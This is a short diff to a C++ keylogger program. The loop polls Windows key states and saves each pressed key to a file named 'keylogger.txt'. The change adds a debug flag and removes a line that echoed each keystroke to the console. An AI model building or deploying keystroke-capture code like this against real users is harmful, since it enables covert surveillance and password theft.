@@ -4,6 +4,7 @@
 #include <ctime>
 
 extern const char* TEXTFILE = "keylogger.txt";
+const bool debug = true;
 
 int main() {
 	//FreeConsole();
@@ -13,7 +14,7 @@ int main() {
 
 	time_t start_time, end_time;
 	std::cout << "Starting Key Logger\n";
-	Saver filesaver = Saver(TEXTFILE);
+	Saver filesaver = Saver(TEXTFILE, debug);
 	time(&start_time);
 
 	while (time_taken<10) {
@@ -21,7 +22,6 @@ int main() {
 		for (i = 8; i <= 255; i++) {
 			if (GetAsyncKeyState(i) & 0x0001) {
 				filesaver.Save(i);
-				std::cout << i<<"\n";
 			}
 		}
 		time(&end_time);
